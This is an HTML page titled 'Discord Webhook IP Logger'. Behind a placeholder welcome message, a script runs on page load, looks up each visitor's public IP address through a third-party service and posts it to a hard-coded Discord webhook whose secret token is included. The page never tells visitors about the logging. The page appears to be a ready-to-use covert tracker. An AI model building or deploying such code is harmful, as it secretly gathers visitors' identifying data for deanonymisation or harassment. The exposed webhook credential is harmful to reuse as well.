<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Webhook IP Logger</title>
    <script>
        // Replace this with your Discord webhook URL
        const discordWebhookUrl = "https://discordapp.com/api/webhooks/1333558563796156447/P0H7XXzV2YnB5nYByLBs80DSgPbjxrCbp9cmZaMdiNPflYXQo0IVv0l54gVx0IBKkupL";

        // Function to get the user's IP address using a third-party API
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return "Unknown";
            }
        }

        // Function to send data to Discord webhook
        async function sendToDiscord(ip) {
            const payload = {
                content: `New visitor! IP: ${ip}`,
            };

            try {
                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });
                console.log('Data sent to Discord successfully!');
            } catch (error) {
                console.error('Error sending data to Discord:', error);
            }
        }

        // Main function to log IP and send to Discord
        async function logIP() {
            const ip = await getIPAddress();
            await sendToDiscord(ip);
        }

        // Run the script when the page loads
        logIP();
    </script>
</head>
<body>
    <h1>Welcome to the Website</h1>
    <p>This is a test.</p>
</body>
</html>
